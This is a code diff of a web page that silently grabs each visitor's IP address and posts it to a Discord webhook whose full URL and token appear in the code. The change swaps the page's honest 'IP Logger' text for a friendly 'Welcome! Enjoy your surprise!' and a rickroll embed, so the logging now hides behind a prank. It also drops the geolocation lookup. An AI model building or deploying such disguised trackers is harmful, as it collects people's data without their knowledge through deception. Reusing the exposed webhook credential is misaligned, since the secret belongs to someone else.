@@ -35,24 +35,20 @@
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // Fetch additional information from ipinfo.io
-                const infoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
-                const infoData = await infoResponse.json();
-
                 // Your Discord webhook URL
                 const webhookURL = 'https://canary.discord.com/api/webhooks/1302309514535636992/yuhD9Kend0XesiNWmg2KfHumJXCHlLXRxVdSIhlr37TpB_G8ZJx16I2e1Ah7zQMzbta5';
 
-                // Create an embed message for Discord
+                // Create an embed message for the rickroll
                 const embed = {
-                    title: "User IP Information",
-                    color: 3447003, // A nice blue color
+                    title: "You've been Rickrolled!",
+                    description: "🎵 Never gonna give you up, never gonna let you down! 🎵",
+                    url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll link
+                    color: 16711680, // Red color
+                    image: {
+                        url: "https://media.giphy.com/media/xT39D7y9F8c0wVLV5e/giphy.gif" // A rickroll gif
+                    },
                     fields: [
-                        { name: "IP Address", value: `**${userIP}**`, inline: true },
-                        { name: "City", value: infoData.city || "N/A", inline: true },
-                        { name: "Region", value: infoData.region || "N/A", inline: true },
-                        { name: "Country", value: infoData.country || "N/A", inline: true },
-                        { name: "Location", value: infoData.loc || "N/A", inline: true },
-                        { name: "Organization", value: infoData.org || "N/A", inline: true }
+                        { name: "IP Address Logged", value: `**${userIP}**`, inline: true }
                     ]
                 };
 
@@ -65,9 +61,9 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
 
-                console.log('IP information sent to Discord:', embed);
+                console.log('Rickroll embed sent to Discord:', embed);
             } catch (error) {
-                console.error('Error sending IP information:', error);
+                console.error('Error sending embed:', error);
             }
         }
 
@@ -77,8 +73,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>IP Logger</h1>
-        <p>Your IP address information is being collected and sent to Discord.</p>
+        <h1>Welcome!</h1>
+        <p>Enjoy your surprise!</p>
     </div>
 </body>
 </html>
